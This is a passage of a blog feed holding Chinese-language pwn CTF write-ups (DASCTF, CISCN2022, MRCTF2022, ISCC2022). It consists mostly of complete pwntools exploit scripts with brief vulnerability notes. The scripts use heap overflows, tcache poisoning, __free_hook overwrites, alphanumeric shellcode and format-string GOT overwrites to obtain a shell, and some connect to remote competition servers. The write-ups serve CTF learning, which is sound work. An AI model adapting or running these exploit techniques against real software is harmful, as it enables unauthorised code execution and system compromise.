class="string">&#x27;MEssa&#x27;</span>)<span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p16(<span class="number">0x56a0</span>))<span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p16(<span class="number">0xc690</span>)</span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#12</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span></span><br><span class="line">add(<span class="number">0x80</span>,payload)<span class="comment">#15</span></span><br><span class="line">libc_base=u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">2</span>)-<span class="number">0x1ac980</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#16</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system))<span class="comment">#18</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2022初赛_pwn_部分wp</title>
    <url>/2022/07/03/CISCN2022-pwn-wp/</url>
    <content><![CDATA[<!-- pwn签到 -->

<span id="more"></span>

<h2 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序的流程是登录执行shellcode，shellcode需要通过检测，使用alpha3生成一个可见字符串shellcode。</p>
<p>生成的shellcode的内容为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>然后利用alpha3来将其转为可见字符形式，且这道题的shellcode的地址是存放在rdx中的，因此在使用alpha3时应该生成 call rdx。<a href="http://blog.rabb1t.xyz/2022/02/08/alphanumeric-shellcode/">alphanumeric_shellcode</a></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;59.110.105.63&#x27;</span>,<span class="number">23231</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.33.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;msg: ro0t \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 1\n&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;msg: &#x27;</span>+shellcode+<span class="string">&#x27; \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 2\n&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2022_pwn方向部分wrieup</title>
    <url>/2022/04/28/MRCTF2022-pwn%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- 由于本人太菜了，只有部分复现成功了。 -->

<span id="more"></span>

<h2 id="ezbash"><a href="#ezbash" class="headerlink" title="ezbash"></a>ezbash</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>一个简易的 bash，用户每创建一个文件夹或文件就会申请一个 0x50 大小的 chunk。</p>
<p>官方给出对应的结构体如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DIR,</span><br><span class="line">    FIL,</span><br><span class="line">&#125; TYPE;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TYPE type;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">pre</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">head</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>用户的输入点只有输入指令的那部分，输入的指令会预先被放入一个 chunk 中，其大小为 0x150 的倍数。</p>
<p>程序中向文件写入内容是通过 echo 配合重定向功能实现或者使用 cp 来将内容复制给其他文件，并且出题人将重定向符号改成了<code>-&gt;</code>，由于本人太菜了，并没有看出来。直接使用 echo 功能来写入时，申请的 chunk 大小也是 0x150 的倍数，而使用 cp 复制时，其申请大小就为 source 文件内容的长度。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据官方 writeup 所述，找到了 cp 功能中执行内容覆盖的那部分，其中有漏洞部分为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">const</span> <span class="keyword">char</span> **)a1 != a2 &amp;&amp; (*(_QWORD *)(a1 + <span class="number">24</span>) || (result = (<span class="keyword">char</span> *)a2[<span class="number">3</span>]) != <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">24</span>) || !a2[<span class="number">3</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">24</span>) &amp;&amp; a2[<span class="number">3</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">24</span>));</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(a2[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          v3 = (<span class="keyword">void</span> **)<span class="built_in">realloc</span>((<span class="keyword">void</span> *)a2[<span class="number">3</span>], v4 + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memset</span>(v3[<span class="number">3</span>], <span class="number">0</span>, v4 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>其中使用 strlen 来获得两个字符串的长度，因此当我们被覆盖字符串与next_chunk的size位相邻时，strlen 得到的长度会比原本的长，产生了溢出漏洞。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>利用 cp 中的溢出漏洞，修改下一块地址的大小，并且由于 glibc 版本为2.31，因此需要的修改大小为非 tcache_chunk_size，释放后再作为文件内容申请，且不改变其中内容，从而泄露libc地址。</p>
<p>然后再通过申请一个较大的 chunk 覆盖几个文件结构体，修改其中指针来将 free_hook 地址放入 tcache 中，再通过申请得到。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,x)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;touch A&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;touch B&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;touch C&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;echo &#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">&#x27; -&gt; A&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;cp A B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;echo &#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span></span><br><span class="line">payload+=p16(<span class="number">0x431</span>)</span><br><span class="line">payload+=<span class="string">&#x27; -&gt; C&#x27;</span></span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;touch &#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;cp C B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;rm C&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;echo -&gt; B&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;cp B 0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;cat 0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">1104</span></span><br><span class="line">libc_base=main_arena-<span class="number">0x1ecb80</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;rm 0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x130</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(free_hook-<span class="number">4</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x51</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">6</span>         <span class="comment"># 将 pre next 指针清空，防止遍历节点时 crash</span></span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;touch getshell&#x27;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;echo /bin/sh -&gt; getshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;touch &#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&#x27;rm getshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2022_pwn方向部分writeup</title>
    <url>/2022/05/27/ISCC2022-pwn%E6%96%B9%E5%90%91writeup/</url>
    <content><![CDATA[<!-- 做的很开心。 -->

<span id="more"></span>

<h2 id="untidy-note"><a href="#untidy-note" class="headerlink" title="untidy_note"></a>untidy_note</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./untidy_note&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7030</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./untidy_note&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;Your choose is:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the note size is:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the size is:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Welcome to use untidy_note,Your name is:&quot;</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#14</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#18</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#19</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#20</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#21</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#22</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p16(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">main_arena=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">96</span></span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebc40</span></span><br><span class="line">libc=elf.libc</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#24</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">24</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-38&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5810)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-38&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;remove&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400896</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(elf.got[<span class="string">&quot;strncmp&quot;</span>])+p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,p64(backdoor)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h2><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./sp1&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,7010)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./sp1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\%39$p&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">241</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main)</span><br><span class="line">system=libc[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr.fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span 